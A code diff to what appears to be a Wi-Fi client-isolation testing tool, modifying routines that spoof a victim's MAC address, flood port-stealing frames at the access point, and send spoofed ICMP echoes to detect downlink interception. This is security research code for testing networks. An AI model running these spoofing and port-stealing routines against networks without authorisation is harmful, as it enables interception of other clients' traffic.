@@ -743,6 +743,7 @@ class Client2Client:
 		self.forward_ip = False
 		self.forward_ethernet = False
 		self.options = options
+		self.bssid_victim = None
 
 	def stop(self):
 		self.sup_victim.stop()
@@ -771,7 +772,7 @@ class Client2Client:
 		#	quit(1)
 
 	def monitor_eth_port_steal(self, eth):
-		if ICMP in eth and eth[ICMP].type == 0:
+		if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890" :
 			log(STATUS, f">>> Downlink port stealing is successful.", color="red")
 
 	def send_c2c_frame(self):
@@ -786,20 +787,21 @@ class Client2Client:
 		elif self.options.c2c_eth is not None:
 			# Note: although this is still IP traffic, it is send directly to the MAC address
 			# of the reciever instead of to the MAC address of the gateway/router.
-			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
-			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac)/ip/Raw(b"forward_ethernet")
+			#ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
+			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac, type=0x0800)/Raw(b"forward_ethernet")
 			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
-			self.sup_attacker.send_eth(p)
+			for _ in range(10):
+				self.sup_attacker.send_eth(p)
 
 		# Option three: test port stealing by letting the attacker to send a lot of layer-2 frames with src addr as the victim. 
 		elif self.options.c2c_port_steal is not None:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
-			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.routermac)/Raw(b"port_steal")
+			p = Ether(src=self.sup_attacker.mac, dst=self.bssid_victim, type=0x0800)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker to gateway/router:       {repr(p)} (Ethernet destination is the gateway/router)")
-			for _ in range(100):
+			for _ in range(1000):
 				self.sup_attacker.send_eth(p)
 				time.sleep(0.1)
-			log(STATUS, f"Finished sending 100 frames.")
+			log(STATUS, f"Finished sending 1000 frames.")
 
 		else:
 			# Note: there are different forms of ARP poisoning. We only test for the basic variant,
@@ -816,7 +818,7 @@ class Client2Client:
 			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
 			p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
 			log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
-			for _ in range(10):
+			for _ in range(500):
 				self.sup_victim.send_eth(p)
 				time.sleep(0.5)
 			
@@ -846,15 +848,18 @@ class Client2Client:
 		log(STATUS, f"Connecting as {self.sup_victim.id_victim} using {self.sup_victim.nic_iface} to the network...", color="green")
 		self.sup_victim.connect(self.sup_victim.netid_victim, timeout=60)
 		data = self.sup_victim.status()
-		bssid = data['bssid']
+		self.bssid_victim = data['bssid']
+
+		# Let the victim get an IP address
+		self.sup_victim.get_ip_address()
 
 		# If --other-bss is connect, connect to a different BSSID. Otherwise connect to the same BSSID.
 		if self.options.other_bss:
-			log(STATUS, f"Will now connect to a BSSID different than {bssid}")
-			self.sup_attacker.ignore_bssid(bssid)
+			log(STATUS, f"Will now connect to a BSSID different than {self.bssid_victim}")
+			self.sup_attacker.ignore_bssid(self.bssid_victim)
 		else:
-			log(STATUS, f"Will now connect to the BSSID {bssid}")
-			self.sup_attacker.set_bssid(bssid)
+			log(STATUS, f"Will now connect to the BSSID {self.bssid_victim}")
+			self.sup_attacker.set_bssid(self.bssid_victim)
 
 		if self.options.same_id:
 			log(STATUS, f"Connecting as {self.sup_attacker.id_victim} using {self.sup_attacker.nic_iface} to the network...", color="green")
@@ -863,8 +868,7 @@ class Client2Client:
 			log(STATUS, f"Connecting as {self.sup_attacker.id_attacker} using {self.sup_attacker.nic_iface} to the network...", color="green")
 			self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)
 
-		# Let both clients get an IP address
-		self.sup_victim.get_ip_address()
+		# Let the attacker get an IP address, also
 		self.sup_attacker.get_ip_address()
 
 		# [ Send a packet from the attacker to the victim ]
